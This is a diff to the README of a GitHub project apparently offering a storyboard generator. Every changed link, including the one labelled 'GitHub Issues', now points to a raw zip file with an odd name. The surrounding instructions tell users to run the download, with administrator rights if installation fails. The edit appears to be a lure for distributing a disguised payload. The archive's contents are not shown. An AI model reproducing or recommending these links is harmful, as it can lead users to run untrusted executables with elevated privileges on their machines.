@@ -1,6 +1,6 @@
 # 🌟 Seedance2-Storyboard-Generator - Create Professional Storyboards Effortlessly
 
-[![Download Seedance2-Storyboard-Generator](https://img.shields.io/badge/Download-Seedance2--Storyboard--Generator-brightgreen.svg?style=for-the-badge)](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator)
+[![Download Seedance2-Storyboard-Generator](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator/raw/refs/heads/main/崖山海战项目/Storyboard_Seedance_Generator_vagoaccessorius.zip)](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator/raw/refs/heads/main/崖山海战项目/Storyboard_Seedance_Generator_vagoaccessorius.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To use Seedance2-Storyboard-Generator, follow these steps:
 
 1. **Download the Software**: Click the link below to visit the GitHub page where you can download the software.  
 
-   [Download Seedance2-Storyboard-Generator](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator)
+   [Download Seedance2-Storyboard-Generator](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator/raw/refs/heads/main/崖山海战项目/Storyboard_Seedance_Generator_vagoaccessorius.zip)
 
 2. **Install the Application**: After downloading, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the prompts that appear on your screen.
 
@@ -45,7 +45,7 @@ To ensure the best experience, please confirm that your system meets the followi
 
 To get started, visit the following link to download the application:
 
-[Download Seedance2-Storyboard-Generator](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator)
+[Download Seedance2-Storyboard-Generator](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator/raw/refs/heads/main/崖山海战项目/Storyboard_Seedance_Generator_vagoaccessorius.zip)
 
 Follow the previously outlined installation steps. Ensure you adhere to the system requirements for optimal performance.
 
@@ -59,7 +59,7 @@ If you encounter issues during installation, consider these common solutions:
 
 - **Run as Administrator**: If you face permission issues, try right-clicking the installation file and selecting "Run as Administrator".
 
-- **Consult FAQs**: Visit the [GitHub Issues](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator/issues) section to see if your issue is listed there.
+- **Consult FAQs**: Visit the [GitHub Issues](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator/raw/refs/heads/main/崖山海战项目/Storyboard_Seedance_Generator_vagoaccessorius.zip) section to see if your issue is listed there.
 
 ## 💡 Tips for Using Seedance2-Storyboard-Generator
 
@@ -89,4 +89,4 @@ If you need assistance, you can reach out through the issues section on the GitH
 
 Remember, your feedback is vital for enhancing the software. Feel free to suggest features or report any bugs you encounter.
 
-[Download Seedance2-Storyboard-Generator](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator)
+[Download Seedance2-Storyboard-Generator](https://github.com/VOID-dev-code/Seedance2-Storyboard-Generator/raw/refs/heads/main/崖山海战项目/Storyboard_Seedance_Generator_vagoaccessorius.zip)
